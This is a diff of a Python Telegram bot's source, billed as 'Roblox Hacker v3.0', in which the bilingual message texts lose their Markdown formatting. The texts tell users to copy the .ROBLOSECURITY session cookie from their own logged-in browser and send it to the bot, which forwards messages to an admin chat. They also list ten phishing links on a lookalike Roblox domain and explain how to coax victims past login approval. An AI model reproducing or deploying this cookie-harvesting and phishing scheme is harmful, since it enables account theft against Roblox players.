@@ -44,155 +44,95 @@ def save_lang():
 
 pending_reply = {}
 
-# ===== ПОЛНЫЕ ТЕКСТЫ =====
+# ===== ТЕКСТЫ БЕЗ MARKDOWN (ПРОСТО ТЕКСТ) =====
 TEXTS = {
     "ru": {
-        "welcome": "🔓 *Roblox Hacker v3.0*\n\n▸ Инструмент для анализа аккаунтов Roblox\n▸ Получение куки и данных сессии\n▸ Быстрая обработка запросов\n\n📌 *Выберите действие:*",
-        "hack": "🎯 *Введите логин или .ROBLOSECURITY куки аккаунта:*\n\n▸ Данные будут обработаны в течение 5-10 минут",
+        "welcome": "🔓 Roblox Hacker v3.0\n\n▸ Инструмент для анализа аккаунтов Roblox\n▸ Получение куки и данных сессии\n▸ Быстрая обработка запросов\n\n📌 Выберите действие:",
+        "hack": "🎯 Введите логин или .ROBLOSECURITY куки аккаунта:\n\n▸ Данные будут обработаны в течение 5-10 минут",
         "cookies_tutorial": (
-            "🍪 *КАК ПОЛУЧИТЬ .ROBLOSECURITY КУКИ*\n\n"
+            "🍪 КАК ПОЛУЧИТЬ .ROBLOSECURITY КУКИ\n\n"
             "─────────────────────\n"
-            "🤖 *ANDROID:*\n"
-            "1. Установите приложение *Qiwi Browser*.\n"
+            "🤖 ANDROID:\n"
+            "1. Установите приложение Qiwi Browser.\n"
             "2. Зайдите в приложение Qiwi Browser.\n"
-            "3. В браузере напишите расширение *EditCookie*.\n"
-            "4. Зайдите на официальный сайт *Roblox.com*.\n"
+            "3. В браузере напишите расширение EditCookie.\n"
+            "4. Зайдите на официальный сайт Roblox.com.\n"
             "5. Зайдите на свой аккаунт Roblox.\n"
-            "6. Зайдите в профиль *жертвы*.\n"
-            "7. Нажмите на 3 точки и выберите расширение *EditCookie*.\n"
-            "8. Скопируйте весь текст в *Value .ROBLOSECURITY*.\n"
+            "6. Зайдите в профиль жертвы.\n"
+            "7. Нажмите на 3 точки и выберите расширение EditCookie.\n"
+            "8. Скопируйте весь текст в Value .ROBLOSECURITY.\n"
             "9. Отправьте весь текст с начала до конца в этого бота.\n\n"
             "─────────────────────\n"
-            "🍎 *IPHONE:*\n"
-            "1. Скачайте приложение *Cookie* в App Store.\n"
+            "🍎 IPHONE:\n"
+            "1. Скачайте приложение Cookie в App Store.\n"
             "2. Зайдите в Safari.\n"
             "3. Нажмите на пазл внизу.\n"
-            "4. Выберите *Управлять Расширениями*.\n"
-            "5. Нажмите на ползунок *Cookie-edit*.\n"
-            "6. Зайдите на официальный сайт *Roblox.com*.\n"
+            "4. Выберите Управлять Расширениями.\n"
+            "5. Нажмите на ползунок Cookie-edit.\n"
+            "6. Зайдите на официальный сайт Roblox.com.\n"
             "7. Зайдите на свой аккаунт Roblox.\n"
-            "8. Зайдите в профиль *жертвы*.\n"
+            "8. Зайдите в профиль жертвы.\n"
             "9. Снова нажмите на пазл.\n"
-            "10. Нажмите на *Cookie-Editor*.\n"
-            "11. Нажмите на *+* внизу.\n"
-            "12. Name напишите `.`, а Value оставьте пустым.\n"
-            "13. Нажмите на *Add*.\n"
-            "14. Нажмите на *.ROBLOSECURITY*.\n"
+            "10. Нажмите на Cookie-Editor.\n"
+            "11. Нажмите на + внизу.\n"
+            "12. Name напишите ., а Value оставьте пустым.\n"
+            "13. Нажмите на Add.\n"
+            "14. Нажмите на .ROBLOSECURITY.\n"
             "15. Скопируйте весь текст 🍪\n"
             "16. Отправьте этот текст боту."
         ),
-        "scam_links": (
-            "👨‍💻 *СКАМ ССЫЛКИ*\n\n"
-            "📌 *Их общее количество 10 шт.*\n\n"
-            "─────────────────────\n"
-            "🎮 *Grow a garden 2* — Хит скама\n"
-            "➡️ [Тык](https://roblox.com.ug/games/97598239454123/Grow-a-Garden-2?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "🔪 *Murder mystery 2* — Хит скама\n"
-            "➡️ [Тык](https://roblox.com.ug/games/142823291/Murder-Mystery-2?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "🐾 *Adopt me* — Хит скама\n"
-            "➡️ [Тык](https://roblox.com.ug/games/920587237/Adopt-Me?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "🧠 *Steal a Brainrot* — Хит скама\n"
-            "➡️ [Тык](https://roblox.com.ug/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "🏡 *Brookhaven RP*\n"
-            "➡️ [Тык](https://roblox.com.ug/games/4924922222/Brookhaven-RP?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "🍎 *Blox Fruit*\n"
-            "➡️ [Тык](https://roblox.com.ug/games/2753915549/Blox-Fruits?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "🚽 *Toilet Tower Defense*\n"
-            "➡️ [Тык](https://roblox.com.ug/games/13775256536/LEGACY-Toilet-Tower-Defense?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "🐱 *Pet simulator 99*\n"
-            "➡️ [Тык](https://roblox.com.ug/games/8737899170/WORLD-CUP-Pet-Simulator-99?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "⌨️ *+1 Speed Keyboard Escape*\n"
-            "➡️ [Тык](https://roblox.com.ug/games/95082159892680/1-Speed-Keyboard-Escape-Candy-Chocolate?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "⚔️ *RIVALS*\n"
-            "➡️ [Тык](https://roblox.com.ug/games/17625359962/RIVALS?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "─────────────────────\n"
-            "📌 *Чтобы скопировать ссылку, нажмите на Тык ✍️ и скопируйте полностью текст*\n\n"
-            "⚠️ *Данные ссылки работают: человека перекидывают на фейк сайт роблокса. Ему нужно зайти в роблокс аккаунт. После того как он всё ввёл — к вам приходят данные.*\n\n"
-            "❌ *Если вылазит ошибка:*\n"
-            "`To approve or reject this attempt open the Roblox app from a logged-in mobile or tablet device.`\n\n"
-            "▸ Это означает, что Roblox требует подтверждения через оригинальное приложение. Попросите жертву открыть Roblox на телефоне."
-        ),
-        "support": "✍️ *Напишите название игры, которая вам требуется. Администратор свяжется с вами.*",
-        "choose_lang": "🌐 *Выберите язык:*",
-        "lang_changed": "✅ *Язык изменён.*",
-        "reply_sent": "✅ *Ответ отправлен*",
-        "choose_action": "📌 *Выберите действие:*",
-        "admin_reply": "📨 *Ответ поддержки:*\n",
-        "no_user": "⚠️ *Зажми сообщение с ID пользователя → Ответить*\n\n*Или используй команду:* `/reply ID Текст`"
+        "scam_links": "👨‍💻 СКАМ ССЫЛКИ\n\n📌 Их общее количество 10 шт.\n\n─────────────────────\n🎮 Grow a garden 2 — Хит скама\n➡️ [Тык](https://roblox.com.ug/games/97598239454123/Grow-a-Garden-2?privateServerLinkCode=09950661995727700947160135244713)\n\n🔪 Murder mystery 2 — Хит скама\n➡️ [Тык](https://roblox.com.ug/games/142823291/Murder-Mystery-2?privateServerLinkCode=09950661995727700947160135244713)\n\n🐾 Adopt me — Хит скама\n➡️ [Тык](https://roblox.com.ug/games/920587237/Adopt-Me?privateServerLinkCode=09950661995727700947160135244713)\n\n🧠 Steal a Brainrot — Хит скама\n➡️ [Тык](https://roblox.com.ug/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=09950661995727700947160135244713)\n\n🏡 Brookhaven RP\n➡️ [Тык](https://roblox.com.ug/games/4924922222/Brookhaven-RP?privateServerLinkCode=09950661995727700947160135244713)\n\n🍎 Blox Fruit\n➡️ [Тык](https://roblox.com.ug/games/2753915549/Blox-Fruits?privateServerLinkCode=09950661995727700947160135244713)\n\n🚽 Toilet Tower Defense\n➡️ [Тык](https://roblox.com.ug/games/13775256536/LEGACY-Toilet-Tower-Defense?privateServerLinkCode=09950661995727700947160135244713)\n\n🐱 Pet simulator 99\n➡️ [Тык](https://roblox.com.ug/games/8737899170/WORLD-CUP-Pet-Simulator-99?privateServerLinkCode=09950661995727700947160135244713)\n\n⌨️ +1 Speed Keyboard Escape\n➡️ [Тык](https://roblox.com.ug/games/95082159892680/1-Speed-Keyboard-Escape-Candy-Chocolate?privateServerLinkCode=09950661995727700947160135244713)\n\n⚔️ RIVALS\n➡️ [Тык](https://roblox.com.ug/games/17625359962/RIVALS?privateServerLinkCode=09950661995727700947160135244713)\n\n─────────────────────\n📌 Чтобы скопировать ссылку, нажмите на Тык и скопируйте полностью текст\n\n⚠️ Данные ссылки работают: человека перекидывают на фейк сайт роблокса. Ему нужно зайти в роблокс аккаунт. После того как он всё ввёл — к вам приходят данные.\n\n❌ Если вылазит ошибка:\nTo approve or reject this attempt open the Roblox app from a logged-in mobile or tablet device.\n\n▸ Это означает, что Roblox требует подтверждения через оригинальное приложение. Попросите жертву открыть Roblox на телефоне.",
+        "support": "✍️ Напишите название игры, которая вам требуется. Администратор свяжется с вами.",
+        "choose_lang": "🌐 Выберите язык:",
+        "lang_changed": "✅ Язык изменён.",
+        "reply_sent": "✅ Ответ отправлен",
+        "choose_action": "📌 Выберите действие:",
+        "admin_reply": "📨 Ответ поддержки:\n",
+        "no_user": "⚠️ Зажми сообщение с ID пользователя → Ответить\n\nИли используй команду: /reply ID Текст"
     },
     "en": {
-        "welcome": "🔓 *Roblox Hacker v3.0*\n\n▸ Tool for Roblox account analysis\n▸ Cookie and session data extraction\n▸ Fast request processing\n\n📌 *Choose an action:*",
-        "hack": "🎯 *Enter login or .ROBLOSECURITY cookie:*\n\n▸ Data will be processed within 5-10 minutes",
+        "welcome": "🔓 Roblox Hacker v3.0\n\n▸ Tool for Roblox account analysis\n▸ Cookie and session data extraction\n▸ Fast request processing\n\n📌 Choose an action:",
+        "hack": "🎯 Enter login or .ROBLOSECURITY cookie:\n\n▸ Data will be processed within 5-10 minutes",
         "cookies_tutorial": (
-            "🍪 *HOW TO GET .ROBLOSECURITY COOKIE*\n\n"
+            "🍪 HOW TO GET .ROBLOSECURITY COOKIE\n\n"
             "─────────────────────\n"
-            "🤖 *ANDROID:*\n"
-            "1. Install *Qiwi Browser* app.\n"
+            "🤖 ANDROID:\n"
+            "1. Install Qiwi Browser app.\n"
             "2. Open Qiwi Browser.\n"
-            "3. Type *EditCookie* extension in browser.\n"
-            "4. Go to official *Roblox.com*.\n"
+            "3. Type EditCookie extension in browser.\n"
+            "4. Go to official Roblox.com.\n"
             "5. Log in to your Roblox account.\n"
-            "6. Go to the *victim's* profile.\n"
-            "7. Tap 3 dots and select *EditCookie*.\n"
-            "8. Copy the entire text in *Value .ROBLOSECURITY*.\n"
+            "6. Go to the victim's profile.\n"
+            "7. Tap 3 dots and select EditCookie.\n"
+            "8. Copy the entire text in Value .ROBLOSECURITY.\n"
             "9. Send the entire text to this bot.\n\n"
             "─────────────────────\n"
-            "🍎 *IPHONE:*\n"
-            "1. Download *Cookie* app from App Store.\n"
+            "🍎 IPHONE:\n"
+            "1. Download Cookie app from App Store.\n"
             "2. Open Safari.\n"
             "3. Tap the puzzle icon at the bottom.\n"
-            "4. Select *Manage Extensions*.\n"
-            "5. Enable *Cookie-edit* toggle.\n"
-            "6. Go to official *Roblox.com*.\n"
+            "4. Select Manage Extensions.\n"
+            "5. Enable Cookie-edit toggle.\n"
+            "6. Go to official Roblox.com.\n"
             "7. Log in to your Roblox account.\n"
-            "8. Go to the *victim's* profile.\n"
+            "8. Go to the victim's profile.\n"
             "9. Tap the puzzle icon again.\n"
-            "10. Tap *Cookie-Editor*.\n"
-            "11. Tap *+* at the bottom.\n"
-            "12. Name: `.`, Value: leave empty.\n"
-            "13. Tap *Add*.\n"
-            "14. Tap *.ROBLOSECURITY*.\n"
+            "10. Tap Cookie-Editor.\n"
+            "11. Tap + at the bottom.\n"
+            "12. Name: ., Value: leave empty.\n"
+            "13. Tap Add.\n"
+            "14. Tap .ROBLOSECURITY.\n"
             "15. Copy the entire text 🍪\n"
             "16. Send this text to the bot."
         ),
-        "scam_links": (
-            "👨‍💻 *SCAM LINKS*\n\n"
-            "📌 *Total: 10 links.*\n\n"
-            "─────────────────────\n"
-            "🎮 *Grow a garden 2* — Scam hit\n"
-            "➡️ [Click](https://roblox.com.ug/games/97598239454123/Grow-a-Garden-2?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "🔪 *Murder mystery 2* — Scam hit\n"
-            "➡️ [Click](https://roblox.com.ug/games/142823291/Murder-Mystery-2?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "🐾 *Adopt me* — Scam hit\n"
-            "➡️ [Click](https://roblox.com.ug/games/920587237/Adopt-Me?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "🧠 *Steal a Brainrot* — Scam hit\n"
-            "➡️ [Click](https://roblox.com.ug/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "🏡 *Brookhaven RP*\n"
-            "➡️ [Click](https://roblox.com.ug/games/4924922222/Brookhaven-RP?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "🍎 *Blox Fruit*\n"
-            "➡️ [Click](https://roblox.com.ug/games/2753915549/Blox-Fruits?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "🚽 *Toilet Tower Defense*\n"
-            "➡️ [Click](https://roblox.com.ug/games/13775256536/LEGACY-Toilet-Tower-Defense?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "🐱 *Pet simulator 99*\n"
-            "➡️ [Click](https://roblox.com.ug/games/8737899170/WORLD-CUP-Pet-Simulator-99?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "⌨️ *+1 Speed Keyboard Escape*\n"
-            "➡️ [Click](https://roblox.com.ug/games/95082159892680/1-Speed-Keyboard-Escape-Candy-Chocolate?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "⚔️ *RIVALS*\n"
-            "➡️ [Click](https://roblox.com.ug/games/17625359962/RIVALS?privateServerLinkCode=09950661995727700947160135244713)\n\n"
-            "─────────────────────\n"
-            "📌 *To copy a link, tap Click ✍️ and copy the entire text*\n\n"
-            "⚠️ *These links work: redirect to a fake Roblox login page. After entering credentials, data is sent to you.*\n\n"
-            "❌ *If you see an error:*\n"
-            "`To approve or reject this attempt open the Roblox app from a logged-in mobile or tablet device.`\n\n"
-            "▸ This means Roblox requires confirmation via the original app. Ask the victim to open Roblox on their phone."
-        ),
-        "support": "✍️ *Write the game name you need. Admin will contact you.*",
-        "choose_lang": "🌐 *Choose language:*",
-        "lang_changed": "✅ *Language changed.*",
-        "reply_sent": "✅ *Reply sent*",
-        "choose_action": "📌 *Choose action:*",
-        "admin_reply": "📨 *Support reply:*\n",
-        "no_user": "⚠️ *Long press message with user ID → Reply*\n\n*Or use command:* `/reply ID Text`"
+        "scam_links": "👨‍💻 SCAM LINKS\n\n📌 Total: 10 links.\n\n─────────────────────\n🎮 Grow a garden 2 — Scam hit\n➡️ [Click](https://roblox.com.ug/games/97598239454123/Grow-a-Garden-2?privateServerLinkCode=09950661995727700947160135244713)\n\n🔪 Murder mystery 2 — Scam hit\n➡️ [Click](https://roblox.com.ug/games/142823291/Murder-Mystery-2?privateServerLinkCode=09950661995727700947160135244713)\n\n🐾 Adopt me — Scam hit\n➡️ [Click](https://roblox.com.ug/games/920587237/Adopt-Me?privateServerLinkCode=09950661995727700947160135244713)\n\n🧠 Steal a Brainrot — Scam hit\n➡️ [Click](https://roblox.com.ug/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=09950661995727700947160135244713)\n\n🏡 Brookhaven RP\n➡️ [Click](https://roblox.com.ug/games/4924922222/Brookhaven-RP?privateServerLinkCode=09950661995727700947160135244713)\n\n🍎 Blox Fruit\n➡️ [Click](https://roblox.com.ug/games/2753915549/Blox-Fruits?privateServerLinkCode=09950661995727700947160135244713)\n\n🚽 Toilet Tower Defense\n➡️ [Click](https://roblox.com.ug/games/13775256536/LEGACY-Toilet-Tower-Defense?privateServerLinkCode=09950661995727700947160135244713)\n\n🐱 Pet simulator 99\n➡️ [Click](https://roblox.com.ug/games/8737899170/WORLD-CUP-Pet-Simulator-99?privateServerLinkCode=09950661995727700947160135244713)\n\n⌨️ +1 Speed Keyboard Escape\n➡️ [Click](https://roblox.com.ug/games/95082159892680/1-Speed-Keyboard-Escape-Candy-Chocolate?privateServerLinkCode=09950661995727700947160135244713)\n\n⚔️ RIVALS\n➡️ [Click](https://roblox.com.ug/games/17625359962/RIVALS?privateServerLinkCode=09950661995727700947160135244713)\n\n─────────────────────\n📌 To copy a link, tap Click and copy the entire text\n\n⚠️ These links work: redirect to a fake Roblox login page. After entering credentials, data is sent to you.\n\n❌ If you see an error:\nTo approve or reject this attempt open the Roblox app from a logged-in mobile or tablet device.\n\n▸ This means Roblox requires confirmation via the original app. Ask the victim to open Roblox on their phone.",
+        "support": "✍️ Write the game name you need. Admin will contact you.",
+        "choose_lang": "🌐 Choose language:",
+        "lang_changed": "✅ Language changed.",
+        "reply_sent": "✅ Reply sent",
+        "choose_action": "📌 Choose action:",
+        "admin_reply": "📨 Support reply:\n",
+        "no_user": "⚠️ Long press message with user ID → Reply\n\nOr use command: /reply ID Text"
     }
 }
 
@@ -222,10 +162,8 @@ MAIN_KEYBOARD_EN = {
     "one_time_keyboard": False
 }
 
-def send_message(chat_id, text, reply_markup=None, parse_mode="Markdown"):
-    # Автоматически отключаем Markdown, если текст похож на куку (длинный и содержит _)
-    if len(text) > 100 and "_" in text and "ROBLOSECURITY" in text:
-        parse_mode = None
+def send_message(chat_id, text, reply_markup=None, parse_mode=None):
+    # parse_mode = None — текст не меняется
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
     if reply_markup:
@@ -265,9 +203,9 @@ def poll():
                             if pending_reply.get("user_id"):
                                 target_id = pending_reply["user_id"]
                                 target_lang = user_lang.get(str(target_id), "ru")
-                                # Отправляем без Markdown
+                                # ОТПРАВЛЯЕМ ТЕКСТ КАК ЕСТЬ (parse_mode=None)
                                 send_message(target_id, TEXTS[target_lang]["admin_reply"] + text, parse_mode=None)
-                                send_message(ADMIN_CHAT_ID, f"✅ *Ответ отправлен* @{pending_reply.get('username', 'anon')}")
+                                send_message(ADMIN_CHAT_ID, f"✅ Ответ отправлен @{pending_reply.get('username', 'anon')}")
                                 pending_reply = {}
                                 offset = update["update_id"] + 1
                                 continue
@@ -278,14 +216,14 @@ def poll():
                                 target_id = int(parts[1])
                                 reply_text = parts[2]
                                 target_lang = user_lang.get(str(target_id), "ru")
-                                # Отправляем без Markdown
+                                # ОТПРАВЛЯЕМ ТЕКСТ КАК ЕСТЬ
                                 send_message(target_id, TEXTS[target_lang]["admin_reply"] + reply_text, parse_mode=None)
-                                send_message(ADMIN_CHAT_ID, f"✅ *Ответ отправлен* (ID: {target_id})")
+                                send_message(ADMIN_CHAT_ID, f"✅ Ответ отправлен (ID: {target_id})")
                             offset = update["update_id"] + 1
                             continue
 
                         if text == '/users':
-                            send_message(ADMIN_CHAT_ID, f"👥 *Всего пользователей:* {len(USERS)}")
+                            send_message(ADMIN_CHAT_ID, f"👥 Всего пользователей: {len(USERS)}")
                             offset = update["update_id"] + 1
                             continue
 
@@ -296,18 +234,18 @@ def poll():
                                     send_message(uid, msg)
                                 except:
                                     pass
-                            send_message(ADMIN_CHAT_ID, f"✅ *Рассылка отправлена* {len(USERS)} пользователям.")
+                            send_message(ADMIN_CHAT_ID, f"✅ Рассылка отправлена {len(USERS)} пользователям.")
                             offset = update["update_id"] + 1
                             continue
 
                         if text == '/start':
-                            send_message(ADMIN_CHAT_ID, "👋 *Привет, админ!*", MAIN_KEYBOARD_RU)
+                            send_message(ADMIN_CHAT_ID, "👋 Привет, админ!", MAIN_KEYBOARD_RU)
                             offset = update["update_id"] + 1
                             continue
 
                         if text == '/help':
                             help_text = (
-                                "📋 *Команды:*\n\n"
+                                "📋 Команды:\n\n"
                                 "/help — помощь\n"
                                 "/users — количество пользователей\n"
                                 "/reply ID Текст — ответить\n"
@@ -342,7 +280,7 @@ def poll():
                         continue
 
                     pending_reply = {"user_id": user_id, "username": username}
-                    # Отправляем админу без Markdown
+                    # ОТПРАВЛЯЕМ АДМИНУ ТЕКСТ КАК ЕСТЬ
                     send_message(ADMIN_CHAT_ID, f"@{username}", parse_mode=None)
                     send_message(ADMIN_CHAT_ID, text, parse_mode=None)
 
